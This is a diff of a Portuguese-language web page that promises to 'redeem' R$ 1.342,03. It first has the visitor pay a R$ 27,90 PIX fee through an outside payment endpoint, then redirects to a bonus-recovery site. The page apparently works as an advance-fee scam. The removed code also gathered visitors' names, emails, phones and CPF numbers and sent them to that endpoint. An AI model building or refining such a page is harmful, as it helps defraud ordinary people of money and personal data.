@@ -30,28 +30,20 @@
     cursor: pointer;
     box-shadow: 0 8px 0 #d1491f, 0 15px 20px rgba(0,0,0,0.2);
     transition: all 0.1s;
-    position: relative;
-    top: 0;
     animation: pulse-orange 2s infinite;
-}
-
-.btn-resgatar:active {
-    top: 8px;
-    box-shadow: 0 0 0 #d1491f, 0 0 0 rgba(0,0,0,0);
 }
 
 .btn-resgatar:disabled {
     background: #ccc;
     box-shadow: none;
-    top: 0;
     animation: none;
     cursor: wait;
 }
 
 @keyframes pulse-orange {
-    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0.7); }
-    70% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(255, 95, 44, 0); }
-    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0); }
+    0% { transform: scale(1); }
+    70% { transform: scale(1.02); }
+    100% { transform: scale(1); }
 }
 
 .overlay {
@@ -61,7 +53,6 @@
     width: 100%; height: 100%;
     background: rgba(0,0,0,0.7);
     z-index: 9998;
-    backdrop-filter: blur(5px);
 }
 
 .modal-pix {
@@ -79,15 +70,21 @@
     max-width: 400px;
 }
 
-#qr_code_div img {
-    margin: 20px auto;
-    border-radius: 10px;
-    max-width: 100%;
-    border: 2px solid #eee;
-}
-
 .btn-copiar {
     background: #28a745;
+    color: white;
+    border: none;
+    padding: 12px;
+    width: 100%;
+    border-radius: 50px;
+    font-weight: 700;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+.btn-final {
+    display: none;
+    background: #007bff;
     color: white;
     border: none;
     padding: 15px;
@@ -112,28 +109,31 @@
 <div class="overlay" id="overlay"></div>
 
 <div class="modal-pix" id="modal_pix">
-    <h3 style="color:#333; margin-bottom:5px;">✅ QR CODE GERADO</h3>
-    <p style="color:#666; font-size:13px; margin-bottom:15px;">
+    <h3 id="status_titulo">✅ QR CODE GERADO</h3>
+    <p id="status_texto" style="font-size:13px;">
         Finalize o pagamento para liberar seu saque.
     </p>
+
     <div id="qr_code_div"></div>
+
     <textarea id="txt_codigo"
         style="width:100%; height:60px; margin-top:10px; background:#f5f5f5;
         border:1px solid #ddd; border-radius:8px; padding:10px;
-        font-size:12px; color:#555;" readonly>Gerando PIX...</textarea>
-    <button class="btn-copiar" onclick="copiarCodigo()">
-        COPIAR CÓDIGO PIX
+        font-size:12px;" readonly>Gerando PIX...</textarea>
+
+    <button class="btn-copiar" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+
+    <!-- BOTÃO FINAL (INVISÍVEL ATÉ PAGAR) -->
+    <button class="btn-final" id="btn_final"
+        onclick="window.location.href='https://recuperabonushopp.com/elementor-1064'">
+        ACESSAR MEU BENEFÍCIO
     </button>
+
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script>
-
-function getURLParameter(name) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(name);
-}
 
 function gerarPix() {
 
@@ -141,28 +141,10 @@ function gerarPix() {
     btn.innerHTML = "PROCESSANDO...";
     btn.disabled = true;
 
-    const urlNome = getURLParameter('nome');
-    const urlEmail = getURLParameter('email');
-    const urlPhone = getURLParameter('phone');
-    const urlCpf = getURLParameter('cpf');
-
-    const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
-
-    const finalNome = urlNome || storedData.nome || "Cliente Consumidor";
-    const finalEmail = urlEmail || storedData.email || "cliente@pagamento.com";
-    const finalPhone = urlPhone || storedData.telefone || "(11)999999999";
-    const finalCpf = urlCpf || storedData.documento || storedData.cpf || "00000000000";
-
     fetch("https://checkout-pix-profissional.onrender.com/pix", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            valor: "27.90",
-            name: finalNome,
-            email: finalEmail,
-            phone: finalPhone,
-            cpf: finalCpf
-        })
+        body: JSON.stringify({ valor: "27.90" })
     })
     .then(res => res.json())
     .then(data => {
@@ -178,18 +160,11 @@ function gerarPix() {
             const qrDiv = document.getElementById("qr_code_div");
             qrDiv.innerHTML = "";
 
-            if (data.encodedImage && data.encodedImage.length > 50) {
-                const src = data.encodedImage.startsWith('http')
-                    ? data.encodedImage
-                    : `data:image/png;base64,${data.encodedImage}`;
-                qrDiv.innerHTML = `<img src="${src}">`;
-            } else {
-                new QRCode(qrDiv, {
-                    text: data.payload,
-                    width: 200,
-                    height: 200
-                });
-            }
+            new QRCode(qrDiv, {
+                text: data.payload,
+                width: 200,
+                height: 200
+            });
 
             if (transactionId) {
                 verificarPagamento(transactionId);
@@ -200,13 +175,6 @@ function gerarPix() {
             btn.innerHTML = "RESGATAR R$ 1.342,03";
             btn.disabled = false;
         }
-
-    })
-    .catch(err => {
-        console.error(err);
-        alert("Erro de conexão.");
-        btn.innerHTML = "RESGATAR R$ 1.342,03";
-        btn.disabled = false;
     });
 }
 
@@ -222,12 +190,14 @@ function verificarPagamento(transactionId) {
 
                 clearInterval(intervalo);
 
-                window.location.href = "https://recuperabonushopp.com/elementor-1064";
+                document.getElementById("status_titulo").innerHTML = "🎉 PAGAMENTO APROVADO!";
+                document.getElementById("status_texto").innerHTML =
+                    "Seu pagamento foi confirmado com sucesso.";
 
+                document.getElementById("btn_final").style.display = "block";
             }
 
-        })
-        .catch(err => console.error("Erro ao verificar status:", err));
+        });
 
     }, 5000);
 }
@@ -235,8 +205,7 @@ function verificarPagamento(transactionId) {
 function copiarCodigo() {
     const copyText = document.getElementById("txt_codigo");
     copyText.select();
-    copyText.setSelectionRange(0, 99999);
-    navigator.clipboard.writeText(copyText.value);
+    document.execCommand("copy");
     alert("Código PIX copiado!");
 }
 
